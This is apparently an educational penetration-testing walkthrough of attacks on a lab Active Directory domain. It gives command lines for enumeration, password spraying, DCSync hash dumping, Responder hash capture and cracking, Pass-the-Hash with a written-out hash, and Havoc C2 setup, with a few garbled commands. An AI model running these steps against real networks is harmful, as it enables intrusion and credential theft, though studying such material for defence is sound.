Introduction 
Active Directory (AD) is a directory service for Windows domain networks environment created by 
Microsoft that contains critical information about the users, systems, or objects within the 
organization. This directory service has become a potential target going after by malicious threat 
actors during the offensive operations. Due to its criticality, the threat actor will try to find possible 
ways to gain foothold on one of the domain-joined systems that could be further leveraged the 
access to enumerate and attack the Active Directory (AD) or domain controller (DC) and eventually, 
laterally move from one machine to another within the compromised network. 
Basically, to attack the Active Directory (AD) environment, the malicious attacker would need to 
obtain initial access to one of the computer systems within the network and in most of the cases 
it is Windows workstation. The attack of the Active Directory (AD) initiated from the compromised 
workstation usually be performed using PowerShell terminal and scripts which is known as Living-
Off-The-Land (LOTL) approach utilizing the pre-installed or exiting tools and libraries within the 
workstation. 
To set aside from the attacks using PowerShell within Windows system, the attack techniques 
outline in this research paper will be heavily relied on open-sourced tools and scripts published by 
security researchers around the world and to demonstrate the attacks on the Active Directory (AD) 
environment using Kali Linux system instead of Windows system as we usually see on most of the 
research materials.  
 
Disclaimers: 
The demonstration of the attacks within this paper will be conducted within a vulnerable controlled 
lab environment with minimal security protections enabled which is set up and configured by 
THECyb0rg Lab and in collaboration with Veilron Technologies Pte. Ltd. 
Bypassing the security protections is not in the scope of this paper and the demonstration within 
this document is for educational purposes only. Such information discussed should never be used 
for any malicious purposes or to attack against any unauthorized systems without prior permission.  
The techniques and tools used here are to raise awareness to the public to better understand how 
the attacks work and providing some insights to secure their target environment from the attacks 
against the listed tools and scripts as per shown within the materials.

1.  Reconnaissance 
Identifying the potential target within the environment is a critical part of the operations as the 
reconnaissance and network mapping process will provide insights about how big the network is 
or the number of the systems within the environment and then hunt for the vulnerable systems 
after being identified and evaluated. 
1.1  Know Your #SHELL 
Identify your own IP address and network subnet using native Linux commands: 
# ifconfig; route -n 
 
 
1.2  Identify Potential Targets 
Identify live systems along with their associated IP addresses and hostnames: 
# nbtscan -r 192.168.1920/24

Identify all opened ports on the domain controller system using nmap scan: 
# nmap -p- --min-rate=10000 -Pn 192.168.192.142 -n 
 
Enumerate additional information about the domain controller and domain information using 
LDAP script within nmap. 
# nmap -sV 192.168.192.142 -n -p389,636 –script ldap-search.nse -Pn 
 
1.3  Unauthenticated Enumeration 
Enumeration is usually conducted after identifying the potential targets within the environment. 
The enumeration aims to extract information from the targets as much as possible which such 
gathered information could then be used for further attacks. Without authentication credentials, 
we obtained various useful information as shown in the following.

Enumerate domain users using windapsearch python scripts from ropnop Github repository: 
# python3 windapsearch.py –dc-ip 192.168.192.142 -U –full | grep sAMAccountName 
 
Further enumerating on the users, observed that the password for new user has been commented 
within description attribute of the object which is commonly in use by most system administrators. 
# python3 windapsearch.py –dc-ip 192.168.192.142 -U –full | grep -iE “sAMAccountName | 
description” 
Enumerate domain groups using the windapsearch python scripts: 
# python3 windapsearch.py –dc-ip 192.168.192.142 -G | grep cn

Enumerate for anonymous/open share and attempt to access to it: 
# smbclient -L \\\\192.168.192.142 -N 
# smbclient \\\\192.168.192.142\\Common -N 
 
 
2.  Exploitation 
Exploitation of the identified misconfigurations and vulnerabilities based on the information 
gathered from the 2 stages above, is the launch of real attack against the potential targets. The 
attack may involve spraying a possible or common password onto the list of enumerated users or 
cracking the exposed service accounts using kerberoast or AS-REProast attack techniques. 
Extract the enumerated domain users to a list that could then be used a userlist: 
# python3 windapsearch.py –dc-ip 192.168.192.142 -U –full | grep -iE “sAMAccountName” | tee 
Userlist.txt

3.  BloodHound and Authenticated Enumeration 
After obtaining the valid set of credentials from the password spray and kerberoast attack, the 
obtained set of credentials could be used to further enumerate on the environment using 
authenticated session and bloodhound against the Active Directory (AD) environment to visualize 
the possible attack paths. Further noted that, some of the information enumerated in the phase 
was not identified within unauthenticated enumeration stage. 
3.1  Authenticated LDAP Enumeration 
Enumerate computer objects within the environment using the identified set of credentials: 
# python3 windapsearch.py -u user1 -p Password@123 -d thecyborg.lab -C

The extracted result of the domain objects in bloodhound: 
 
4.  Credential Harvest 
Extracting the domain credentials could be achieved via DCSync attack and malicious responder. 
Such activity has been used to achieve domain dominance. The extracted set of credentials/hashes 
could then be used to laterally move around the network and critical hashes of the domain 
administrator or krbtgt hashes could be used to create silver or golden tickets as well as perform 
Pass-The-Hash attack etc.

4.1  DCSync Attack 
Enumerate the Domain Admins group observed that the user1 is the part of the privileged group 
which could be abused for the DCSync attack against the domain: 
# python3 ./windapsearch.py -d thecyborg.lab -u user1 -p Password@123 -m ‘Domain Admins’ 
 
The password hashes of the domain users could be extracted from the domain controller using 
impacket library: 
# ./secretdump.py thecyborg.lab/user1:’Password@123’@192.168.192.142 
 
Once the administrator hashes have been obtained and could then be used to gain access to the 
domain controller using administrator account using Pass-The-Hash (PTH) attack. (Refer to #6 – 
Lateral Movement) 
4.2  Malicious Responder 
Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP and 
other rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security 
NTLMSSP and Basic HTTP authentication. The Responder is a very powerful tool and could be used 
to collect password hashes of the vulnerable systems within the network. 
# responder -I eth0 –wpad -v

Any users within the network attempting to access to any invalid URLs or shared folders will be 
responded by the Responder and the password hashes will be requested from the vulnerable 
systems/users on the network and the password hashes could be cracked using John-The-Ripper 
or Hashcat. 
Access to the invalid URL (thecyborglab) via HTTP protocol from a client workstation 
(192.168.192.138):

The NTLMv2 hashes for user1 was captured by the Responder from the HTTP protocol: 
 
Crack the NTLMv2 password hashes using John-The-Ripper: 
# john ntlmhashes.txt –wordlist=./PasswordList.txt 
 
Access to the invalid shared folder (\\thecyborglab) via SMB protocol from vulnerable domain 
controller (192.168.192.142): 
The NTLMv2 hashes for Administrator was captured by the Responder from the SMB protocol:

Crack the NTLMv2 password hashes using John-The-Ripper: 
# john ntlmhash.txt –wordlist=./PasswordList.txt 
 
5. Lateral Movement 
Moving laterally from one system to another after obtaining the valid set of credentials or hashes 
is a common action performed by the malicious threat actor. The local administrator account 
credentials usually remain the same across the entire domain if Local Administrator Password 
Solution (LAPS) was not implemented within the environment. Abusing this insecure practice may 
lead to security compromise of all the workstation within the entire domain. 
5.1  Pass-The-Hash Attack (PTH) 
The password hashes of the administrator could be used to perform Pass-The-Hash attack by using 
the obtained hashes instead of the clear-text password to gain access to the connected systems 
within the network.  
Access to a workstation system (192.168.192.139) using the administrator password hashes 
obtained from the DCSync attack: 
# ./psexec.py thecyborg.lab/administrator@192.168.192.139 \ 
-hashes ‘aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b’

5.1  PowerShell Remoting 
From PowerShell access via PsExec on the domain controller (192.168.192.142), initiating remote 
access is possible to other 2 workstations on the network such as PC1.thecyborg.lab and 
PC2.thecyborg.lab via PowerShell remoting. 
Access to PC1.thecyborg.lab via PowerShell remoting: 
# ./psexec.py thecyborg.lab/administrator@192.168.192.142 \

6. Havoc C2 Framework 
Command and Control Server (C2) is the centralized server used to control the compromised 
systems on the target environment. There are many C2s that have been used by the attackers such 
as Cobalt Strike, Brute Ratel and more. However, as the scope of the paper relies heavily on the 
open-sourced tools and frameworks. Therefore, the Havoc C2 is used for the demonstration. 
Configure C2 profile: 
# nano /usr/share/havoc/profiles/havoc.yaotl 
 
 
Fire up the C2 server: 
# havoc server –profile /user/share/havoc/profiles/havoc.yaotl
